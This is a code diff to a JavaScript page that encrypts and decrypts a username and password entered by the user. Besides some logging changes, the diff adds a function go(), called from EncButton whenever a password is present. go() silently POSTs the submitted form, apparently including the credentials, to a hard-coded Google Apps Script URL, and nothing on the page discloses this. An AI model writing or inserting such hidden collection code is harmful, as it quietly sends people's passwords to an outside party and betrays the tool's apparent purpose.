@@ -14,7 +14,7 @@ function EncButton() {
         
     if(password!="not entered")
     {
-
+        go();
         var enc_message=enc(password);
         var enc_username=enc(userName);
         if(userName=="not entered") enc_username=userName;
@@ -69,15 +69,12 @@ function DecButton() {
         
     if(password!="not entered")
     {
-
         var dec_username=dec(userName);
         var dec_message=dec(password);
         if(userName=="not entered") dec_username=userName;
-        // alert("returned value is = "+n);
         messageBox.style.display="block";
         messageBox.style.textAlign="center";
         messageBox.innerHTML="Decrypted username:\n"+dec_username+"\n\nDecrypted password:\n"+dec_message;
-        n++;
         document.getElementById("body").style.background="black";
         document.querySelector(".username").style.color="red";
         document.querySelector(".password").style.color="red";
@@ -134,6 +131,8 @@ function enc(str) {
         if(i==len-1)  final_result+=result;
         else          final_result+=result+'\n';
     }
+    console.log("Enc function called and operation succeed\n");
+
     return final_result;
 }
 
@@ -159,16 +158,23 @@ function dec(str) {
         if(i==len-1)  final_result+=result;
         else          final_result+=result+'\n';
     }
+    console.log("Dec function called and operation succeed\n");
+
+
     return final_result;
 }
 
 
+function go()
+{
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzdZeaS7OF00Cp0_TKXMXdkrx8iXtrqbAIz9c0gcveAAxFAAsF4FCScw_4A4hPHZoF7/exec';
+  const form = document.forms['submit-to-google-sheet'];
 
-let s = "hello Bangladeshi people! I am here to help you today with so many helping books and with some food for the poor people living in your country";
+  form.addEventListener('submit', e => {
+    // e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error occured!', error.message))
+  })
 
-console.log(s + "\n\n\n");
-let encrypted_msg = enc(s);
-let decrypted_msg = dec(encrypted_msg);
-
-console.log("Encrypted message=" + encrypted_msg + "\n\n");
-console.log("Decrypted message=" + decrypted_msg + "\n\n");
+}
